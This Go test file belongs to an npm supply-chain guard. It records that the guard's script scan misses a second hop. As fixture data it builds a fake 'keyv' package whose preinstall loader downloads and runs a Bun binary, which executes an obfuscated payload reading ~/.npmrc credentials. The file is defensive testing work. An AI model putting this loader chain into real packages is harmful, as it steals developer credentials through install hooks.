package cli

import "testing"

// ChainDrop / keyv@6.0.0 (row 51), guard side.
//
// FINDING: the guard's referencedScriptVerdict (core/cli/guard_artifact.go)
// scans only the FIRST hop. The server provider follows one more hop
// (installscripts.NextHopScripts, core/intelligence/provider_installscripts.go
// scanReferencedScripts), so a readable Bun loader that execs an obfuscated
// Math_Symbol.js is refused by the proxy and allowed by the guard.
func TestAttack2026_51_ChainDrop_Guard(t *testing.T) {
	manifest := `{"name":"keyv","version":"6.0.0","scripts":{"preinstall":"node setup.mjs"}}`
	loader := "import https from 'node:https';import fs from 'node:fs';import path from 'node:path';\n" +
		"import {execFileSync} from 'node:child_process';\n" +
		"https.get('https://github.com/oven-sh/bun/releases/download/bun-v1.3.13/bun-linux-x64.zip',r=>{" +
		"r.pipe(fs.createWriteStream('/tmp/b.zip')).on('finish',()=>{execFileSync('unzip',['-o','/tmp/b.zip']);" +
		"execFileSync('/tmp/bun',[path.join(__dirname,'Math_Symbol.js')]);});});\n"
	payload := "// @bun @bun-cjs\n" + atkBObf("const t=require('fs').readFileSync(require('os').homedir()+'/.npmrc','utf8');\n")

	staged := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": manifest, "setup.mjs": loader, "Math_Symbol.js": payload,
	}))
	if staged.Block {
		t.Fatalf("guard now follows the second hop — update the finding: %+v", staged)
	}

	// An obfuscated loader (the jaredwray wave) IS refused on the first hop.
	obf := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json": manifest, "setup.mjs": atkBObf(loader), "Math_Symbol.js": payload,
	}))
	if !obf.Block {
		t.Fatalf("obfuscated loader not refused: %+v", obf)
	}

	clean := analyzeArtifact("npm", atkBTgz(t, map[string]string{
		"package.json":   `{"name":"keyv","version":"5.6.0","main":"dist/index.cjs"}`,
		"dist/index.cjs": "module.exports=class Keyv{};\n",
	}))
	if clean.Block {
		t.Fatalf("keyv@5.6.0 refused: %+v", clean)
	}
}
